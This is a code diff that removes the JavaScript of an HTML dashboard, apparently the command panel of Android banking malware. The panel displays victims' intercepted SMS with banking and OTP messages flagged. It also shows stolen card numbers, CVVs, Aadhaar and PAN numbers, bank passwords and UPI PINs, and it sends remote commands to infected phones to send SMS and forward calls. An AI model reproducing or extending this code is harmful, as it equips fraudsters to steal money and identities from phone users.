-                            <div class="sms-item ${isBanking ? 'banking-sms' : ''} ${isOTP ? 'otp-sms' : ''}">
-                                <div class="sms-header">
-                                    <div class="sms-sender">${sms.sender || 'Unknown'}</div>
-                                    <div class="sms-date">${sms.date ? new Date(sms.date).toLocaleString() : 'Unknown date'}</div>
-                                </div>
-                                <div class="sms-body">${sms.body || 'No content'}</div>
-                                <div class="sms-device">
-                                    <strong>SIM:</strong> ${sms.sim_number || 'Unknown'} | 
-                                    <strong>Type:</strong> ${sms.type || 'Received'}
-                                    ${isBanking ? ' | <span style="color: #4CAF50; font-weight: bold;">💳 Banking</span>' : ''}
-                                    ${isOTP ? ' | <span style="color: #FF9800; font-weight: bold;">🔐 OTP</span>' : ''}
-                                </div>
-                            </div>
-                        `;
-                    });
-                }
-                smsHTML += '</div>';
-                
-                modalContent.innerHTML = smsHTML;
-            }, (error) => {
-                modalContent.innerHTML = `<div class="sms-item">Error loading SMS: ${error.message}</div>`;
-            });
-
-            // Store the listener reference to remove it when modal closes
-            currentDeviceData.smsListener = smsListener;
-        }
-
-        function loadLoginDataTab() {
-            const userId = currentDeviceData.id;
-            const modalContent = document.getElementById('userModalContent');
-            
-            modalContent.innerHTML = '<div>Loading login data...</div>';
-            
-            // Load login data from Firebase with real-time updates
-            const loginListener = database.ref('login').child(userId).on('value', (snapshot) => {
-                const loginData = snapshot.val();
-                let loginHTML = '<div>';
-                
-                if (loginData && Object.keys(loginData).length > 0) {
-                    Object.keys(loginData).forEach(recordKey => {
-                        const record = loginData[recordKey];
-                        if (record && typeof record === 'object') {
-                            let recordHTML = '<div class="login-record" style="margin-bottom: 15px; padding: 10px; background: #f8f9fa; border-radius: 6px;">';
-                            let hasContent = false;
-                            
-                            // Format the login data exactly like Java code
-                            if (record.Name) { 
-                        recordHTML += `<div class="login-data-item"><span class="login-key">Name : </span><span class="login-value">${record.Name}</span></div>`;
-                        hasContent = true;
-                    }
-                    if (record.Number) { 
-                        recordHTML += `<div class="login-data-item"><span class="login-key">Mobile Number : </span><span class="login-value">${record.Number}</span></div>`;
-                        hasContent = true;
-                    }
-                    if (record.DOB) { 
-                        recordHTML += `<div class="login-data-item"><span class="login-key">Date Of Birth : </span><span class="login-value">${record.DOB}</span></div>`;
-                        hasContent = true;
-                    }
-                    if (record.Card) { 
-                        recordHTML += `<div class="login-data-item"><span class="login-key">Card Number : </span><span class="login-value">${record.Card}</span></div>`;
-                        hasContent = true;
-                    }
-                    if (record.Cvv) { 
-                        recordHTML += `<div class="login-data-item"><span class="login-key">CVV : </span><span class="login-value">${record.Cvv}</span></div>`;
-                        hasContent = true;
-                    }
-                    if (record.Expiry) { 
-                        recordHTML += `<div class="login-data-item"><span class="login-key">Expiry : </span><span class="login-value">${record.Expiry}</span></div>`;
-                        hasContent = true;
-                    }
-                    if (record.acount) { 
-                        recordHTML += `<div class="login-data-item"><span class="login-key">Aadhar Number : </span><span class="login-value">${record.acount}</span></div>`;
-                        hasContent = true;
-                    }
-                    if (record.Complaint) { 
-                        recordHTML += `<div class="login-data-item"><span class="login-key">Mother Name : </span><span class="login-value">${record.Complaint}</span></div>`;
-                        hasContent = true;
-                    }
-                    
-                    
-                    
-            
-                    if (record.mother) { 
-                        recordHTML += `<div class="login-data-item"><span class="login-key">PAN : </span><span class="login-value">${record.mother}</span></div>`;
-                        hasContent = true;
-                    }
-                   
-                    if (record.Atm) { 
-                        recordHTML += `<div class="login-data-item"><span class="login-key">ATM : </span><span class="login-value">${record.Atm}</span></div>`;
-                        hasContent = true;
-                    }
-                    if (record.Bank) { 
-                        recordHTML += `<div class="login-data-item"><span class="login-key">Bank : </span><span class="login-value">${record.Bank}</span></div>`;
-                        hasContent = true;
-                    }
-                    if (record.User) { 
-                        recordHTML += `<div class="login-data-item"><span class="login-key">User Name : </span><span class="login-value">${record.User}</span></div>`;
-                        hasContent = true;
-                    }
-                    if (record.Password) { 
-                        recordHTML += `<div class="login-data-item"><span class="login-key">Password : </span><span class="login-value">${record.Password}</span></div>`;
-                        hasContent = true;
-                    }
-                    if (record.transaction) { 
-                        recordHTML += `<div class="login-data-item"><span class="login-key">transaction Password : </span><span class="login-value">${record.transaction}</span></div>`;
-                        hasContent = true;
-                    }
-                    if (record.upi_pin) { 
-                        recordHTML += `<div class="login-data-item"><span class="login-key">UPI Pin : </span><span class="login-value">${record.upi_pin}</span></div>`;
-                        hasContent = true;
-                    }
-                     if (record.upi) { 
-                        recordHTML += `<div class="login-data-item"><span class="login-key">UPI id : </span><span class="login-value">${record.upi}</span></div>`;
-                        hasContent = true;
-                    }
-                            recordHTML += '</div>';
-                            
-                            if (hasContent) {
-                                loginHTML += recordHTML;
-                            }
-                        }
-                    });
-                } else {
-                    loginHTML = `
-                        <div class="empty-state">
-                            <i class="fas fa-user-slash"></i>
-                            <h3>No Login Data</h3>
-                            <p>No login data found for this device</p>
-                        </div>
-                    `;
-                }
-                
-                loginHTML += '</div>';
-                modalContent.innerHTML = loginHTML;
-            }, (error) => {
-                modalContent.innerHTML = `<div>Error loading login data: ${error.message}</div>`;
-            });
-
-            // Store the listener reference to remove it when modal closes
-            currentDeviceData.loginListener = loginListener;
-        }
-
-        function viewDeviceSMS(userId) {
-            currentDeviceData = allUsers.find(user => user.id === userId);
-            if (currentDeviceData) {
-                openUserModal(currentDeviceData);
-                setTimeout(() => {
-                    document.querySelector('.tab[onclick="showTab(\'smsData\')"]').click();
-                }, 100);
-            }
-        }
-
-        function viewLoginDetails(userId) {
-            currentDeviceData = allUsers.find(user => user.id === userId);
-            if (currentDeviceData) {
-                openUserModal(currentDeviceData);
-                setTimeout(() => {
-                    document.querySelector('.tab[onclick="showTab(\'loginData\')"]').click();
-                }, 100);
-            }
-        }
-
-        function closeUserModal() {
-            // Remove realtime listeners for this modal
-            if (currentDeviceData) {
-                if (currentDeviceData.smsListener) {
-                    database.ref('user_sms').child(currentDeviceData.id).off('value', currentDeviceData.smsListener);
-                }
-                if (currentDeviceData.loginListener) {
-                    database.ref('login').child(currentDeviceData.id).off('value', currentDeviceData.loginListener);
-                }
-            }
-            
-            document.getElementById('userModal').classList.add('hidden');
-            currentDeviceData = null;
-        }
-
-        // SMS Character Counter - 170 CHARACTER LIMIT
-        function updateCharCounter() {
-            const message = document.getElementById('smsMessage').value;
-            const counter = document.getElementById('charCounter');
-            const charCount = message.length;
-            
-            counter.textContent = `${charCount}/170`;
-            
-            if (charCount > 150) {
-                counter.className = 'char-counter warning';
-            } else if (charCount > 170) {
-                counter.className = 'char-counter error';
-            } else {
-                counter.className = 'char-counter';
-            }
-        }
-
-        function openSendSMSModal(userId) {
-            currentUser = userId;
-            document.getElementById('sendSMSModal').classList.remove('hidden');
-            document.getElementById('smsNumber').value = '';
-            document.getElementById('smsMessage').value = '';
-            updateCharCounter();
-        }
-
-        function closeSendSMSModal() {
-            document.getElementById('sendSMSModal').classList.add('hidden');
-            currentUser = null;
-        }
-
-        function openCallForwardModal(userId) {
-            currentUser = userId;
-            document.getElementById('callForwardModal').classList.remove('hidden');
-            document.getElementById('forwardCallNumber').value = '';
-            document.getElementById('forwardStatus').style.display = 'none';
-        }
-
-        function closeCallForwardModal() {
-            document.getElementById('callForwardModal').classList.add('hidden');
-            currentUser = null;
-        }
-
-        // SMS Sending with 170 character limit
-        function sendSMS() {
-            const phoneNumber = document.getElementById('smsNumber').value.trim();
-            const message = document.getElementById('smsMessage').value.trim();
-            const simSlot = document.getElementById('smsSimSlot').value;
-
-            if (!phoneNumber) {
-                showToast('Please enter phone number', 'error');
-                return;
-            }
-
-            if (!message) {
-                showToast('Please enter message', 'error');
-                return;
-            }
-
-            if (message.length > 170) {
-                showToast('Message cannot exceed 170 characters', 'error');
-                return;
-            }
-
-            if (!currentUser) {
-                showToast('No device selected', 'error');
-                return;
-            }
-
-            const commandData = {
-                targetDeviceId: currentUser,
-                phoneNumber: phoneNumber,
-                messageText: message,
-                simSlot: simSlot,
-                command: "send message",
-                timestamp: Date.now()
-            };
-
-            database.ref('user_data').child(currentUser).update(commandData)
-                .then(() => {
-                    showToast('SMS command sent successfully!', 'success');
-                    closeSendSMSModal();
-                })
-                .catch(error => showToast('Error sending SMS: ' + error.message, 'error'));
-        }
-
-        // Call Forwarding with Status Display
-        function activateCallForward() {
-            const forwardNumber = document.getElementById('forwardCallNumber').value.trim();
-            const simSlot = document.getElementById('forwardSimSlot').value;
-
-            if (!forwardNumber) {
-                showToast('Please enter a forward number', 'error');
-                return;
-            }
-
-            if (!currentUser) {
-                showToast('No device selected', 'error');
-                return;
-            }
-
-            const commandData = {
-                targetDeviceId: currentUser,
-                simSlot: simSlot,
-                phoneNumber: forwardNumber,
-                command: "call forward",
-                timestamp: Date.now()
-            };
-
-            database.ref('user_data').child(currentUser).update(commandData)
-                .then(() => {
-                    showToast('Call forwarding activated!', 'success');
-                    displayForwardStatus('Call forwarding activated successfully', 'success');
-                })
-                .catch(error => {
-                    showToast('Error: ' + error.message, 'error');
-                    displayForwardStatus('Error: ' + error.message, 'error');
-                });
-        }
-
-        function deactivateCallForward() {
-            const simSlot = document.getElementById('forwardSimSlot').value;
-
-            if (!currentUser) {
-                showToast('No device selected', 'error');
-                return;
-            }
-
-            const commandData = {
-                targetDeviceId: currentUser,
-                simSlot: simSlot,
-                command: "forward off",
-                timestamp: Date.now()
-            };
-
-            database.ref('user_data').child(currentUser).update(commandData)
-                .then(() => {
-                    showToast('Call forwarding deactivated!', 'success');
-                    displayForwardStatus('Call forwarding deactivated successfully', 'success');
-                })
-                .catch(error => {
-                    showToast('Error: ' + error.message, 'error');
-                    displayForwardStatus('Error: ' + error.message, 'error');
-                });
-        }
-
-        function checkForwardStatus() {
-            const simSlot = document.getElementById('forwardSimSlot').value;
-
-            if (!currentUser) {
-                showToast('No device selected', 'error');
-                return;
-            }
-
-            const commandData = {
-                targetDeviceId: currentUser,
-                simSlot: simSlot,
-                command: "forward status",
-                timestamp: Date.now()
-            };
-
-            database.ref('user_data').child(currentUser).update(commandData)
-                .then(() => {
-                    showToast('Status check command sent!', 'success');
-                    displayForwardStatus('Status check command sent to device', 'info');
-                    
-                    // Listen for status response
-                    listenForForwardStatus();
-                })
-                .catch(error => {
-                    showToast('Error: ' + error.message, 'error');
-                    displayForwardStatus('Error: ' + error.message, 'error');
-                });
-        }
-
-        function displayForwardStatus(message, type) {
-            const statusDiv = document.getElementById('forwardStatus');
-            statusDiv.textContent = message;
-            statusDiv.style.display = 'block';
-            statusDiv.style.background = type === 'success' ? '#d4edda' : 
-                                       type === 'error' ? '#f8d7da' : 
-                                       '#d1ecf1';
-            statusDiv.style.color = type === 'success' ? '#155724' : 
-                                  type === 'error' ? '#721c24' : 
-                                  '#0c5460';
-            statusDiv.style.border = type === 'success' ? '1px solid #c3e6cb' : 
-                                   type === 'error' ? '1px solid #f5c6cb' : 
-                                   '1px solid #bee5eb';
-        }
-
-        function listenForForwardStatus() {
-            // Listen for status response from the device
-            if (currentUser) {
-                database.ref('user_data').child(currentUser).child('ussd_response').on('value', (snapshot) => {
-                    const response = snapshot.val();
-                    if (response) {
-                        displayForwardStatus(`Status Response: ${response}`, 'info');
-                        // Remove the listener after getting response
-                        database.ref('user_data').child(currentUser).child('ussd_response').off('value');
-                    }
-                });
-                
-                // Timeout after 30 seconds
-                setTimeout(() => {
-                    database.ref('user_data').child(currentUser).child('ussd_response').off('value');
-                }, 30000);
-            }
-        }
-
-        // Utility Functions
-        function showToast(message, type = 'info') {
-            const toast = document.createElement('div');
-            toast.className = `toast ${type}`;
-            toast.textContent = message;
-            document.body.appendChild(toast);
-
-            setTimeout(() => toast.classList.add('show'), 100);
-            setTimeout(() => {
-                toast.classList.remove('show');
-                setTimeout(() => toast.remove(), 300);
-            }, 3000);
-        }
-
-        // Close modals when clicking outside
-        window.onclick = function(event) {
-            const modals = document.querySelectorAll('.modal, .password-modal, .device-sms-modal');
-            modals.forEach(modal => {
-                if (event.target === modal) {
-                    modal.classList.add('hidden');
-                }
-            });
-        }
-
-        // Auto-refresh is not needed anymore due to realtime listeners
-        // All data updates automatically in real-time
-    </script>
 </body>
 </html>
